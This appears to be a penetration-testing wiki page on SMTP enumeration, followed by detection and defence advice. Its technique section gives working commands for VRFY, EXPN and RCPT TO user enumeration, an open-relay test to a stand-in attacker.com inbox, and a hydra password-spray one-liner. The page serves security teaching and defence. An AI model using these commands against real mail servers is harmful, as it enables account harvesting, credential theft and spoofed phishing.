---
title: SMTP enumeration
slug: smtp-enum
---

> **TL;DR:** TCP/25/465/587. `VRFY`, `EXPN`, `RCPT TO` user-enum, open-relay tests, and AUTH-method survey turn a mail server into a user-list factory and (occasionally) a delivery foothold.

## What it is
SMTP is the SMTP protocol — line-based ASCII over TCP/25 (server-to-server), 587 (submission with STARTTLS), 465 (implicit TLS). It exposes commands that historically existed for debugging — `VRFY <user>` confirms a mailbox, `EXPN <list>` expands an alias — and the `RCPT TO:` command silently accepts or rejects recipients based on local-part validity. For an attacker, that is a user-enumeration primitive. Add open-relay testing (server forwards mail to arbitrary external recipients), AUTH-mechanism listing (`AUTH LOGIN`, `AUTH PLAIN`, `AUTH NTLM` for Exchange), and STARTTLS downgrade quirks and the service yields names, valid email addresses, and sometimes credentials.

## Preconditions / where it applies
- TCP/25 or 587 reachable. Edge mail relays expose 25; submission tier exposes 587.
- A list of candidate usernames (first.last, flast, etc.) — feed from [[osint-recon]].
- Server runs an MTA that has not disabled `VRFY/EXPN` and/or returns differentiable `250 OK` vs `550 No such user` on `RCPT TO:`.
- Related: [[ldap-enum]], [[smb-enum]], [[password-spraying]].

## Technique
Banner and command set:

```bash
nmap -p25,465,587 -sV --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-ntlm-info,smtp-vuln-cve2010-4344 TARGET
```

Manual probe — the banner often gives MTA and version (Postfix/Exim/Sendmail/Exchange):

```text
$ nc TARGET 25
220 mx.corp.local ESMTP Postfix
EHLO attacker.com
250-mx.corp.local
250-PIPELINING
250-STARTTLS
250-AUTH PLAIN LOGIN
250 SMTPUTF8
VRFY admin
252 2.0.0 admin
VRFY nonexistent
550 5.1.1 <nonexistent>: Recipient address rejected
```

`RCPT TO:` enumeration works when `VRFY` is disabled:

```text
MAIL FROM:<probe@attacker.com>
RCPT TO:<jdoe@corp.local>      → 250 OK   (exists)
RCPT TO:<ghost@corp.local>     → 550 5.1.1 Recipient ... (does not exist)
```

`smtp-user-enum` automates the three modes (`VRFY`, `EXPN`, `RCPT`):

```bash
smtp-user-enum -M RCPT -U users.txt -t TARGET -D corp.local
```

Open-relay test — send through the server to an external recipient you control:

```text
MAIL FROM:<test@attacker.com>
RCPT TO:<inbox@attacker.com>
DATA
Subject: relay test

.
```

A `250 Queued` followed by delivery to your inbox proves the relay. Combined with SPF-trust, this lets attackers send convincing phishing as the org's domain.

Exchange-specific: `AUTH NTLM` over SMTP leaks the internal domain, hostname, and DNS suffix via the Type-2 challenge — `nmap --script smtp-ntlm-info` extracts these without authenticating. Useful internal reconnaissance from an external IP.

Credential spray against AUTH LOGIN/PLAIN with `hydra -L users -P passwords smtp://TARGET:587`. Mind the rate — many MTAs throttle or blacklist after a handful of failures.

STARTTLS downgrade — sniff `220` banner, if the server accepts unencrypted AUTH after `STARTTLS`-stripping by an attacker-in-the-middle, creds leak in cleartext.

## Detection and defence
- MTA logs show `VRFY`/`EXPN` attempts and bulk `RCPT TO:` rejection patterns — alert on >N rejected recipients per sender per minute.
- Disable `VRFY` and `EXPN` (`disable_vrfy_command = yes` in Postfix), normalise responses so valid vs invalid recipients return the same code/timing.
- Require AUTH on submission (587) and never allow relay without authentication (`smtpd_recipient_restrictions` ordering in Postfix). Publish SPF, DKIM, and DMARC `p=reject` to neutralise relay abuse.
- Patch — old MTA CVEs (Exim CVE-2019-10149, Sendmail prepend) are pre-auth RCE.

## References
- [HackTricks — 25,465,587 SMTP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html) — enum scripts and modern MTA quirks.
- [Postfix — Restrictions](https://www.postfix.org/SMTPD_ACCESS_README.html) — relay restrictions and rejection codes.
- [Nmap NSE — smtp-enum-users](https://nmap.org/nsedoc/scripts/smtp-enum-users.html) — VRFY/EXPN/RCPT modes.
